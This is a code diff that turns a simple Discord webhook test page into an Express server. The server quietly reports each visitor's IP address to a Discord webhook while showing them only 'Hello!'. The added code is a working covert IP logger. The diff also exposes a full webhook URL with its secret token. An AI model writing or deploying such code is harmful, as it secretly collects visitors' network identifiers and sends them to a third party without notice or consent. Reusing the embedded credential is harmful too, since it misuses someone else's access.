@@ -1,27 +1,20 @@
-<!DOCTYPE html>
-<html>
-<head>
-  <title>Webhook Test</title>
-</head>
-<body>
+const express = require("express");
+const fetch = require("node-fetch");
 
-<button onclick="sendMessage()">Send Test</button>
+const app = express();
 
-<script>
-function sendMessage() {
-  fetch("https://discord.com/api/webhooks/1474902418302173205/FOchWYW0XF66_UMhCp1F8eKmDuQXcm7XCrRftR854OSRwEgJ8EKnkqlRKbghDmgc1vh-", {
+app.get("/", async (req, res) => {
+  const ip = req.headers["x-forwarded-for"] || req.socket.remoteAddress;
+
+  await fetch("https://discord.com/api/webhooks/1474902418302173205/FOchWYW0XF66_UMhCp1F8eKmDuQXcm7XCrRftR854OSRwEgJ8EKnkqlRKbghDmgc1vh-", {
     method: "POST",
-    headers: {
-      "Content-Type": "application/json"
-    },
+    headers: { "Content-Type": "application/json" },
     body: JSON.stringify({
-      content: "Webhook works!"
+      content: `New visitor IP: ${ip}`
     })
-  })
-  .then(response => alert("Sent!"))
-  .catch(error => alert("Error: " + error));
-}
-</script>
+  });
 
-</body>
-</html>
+  res.send("Hello!");
+});
+
+app.listen(3000);
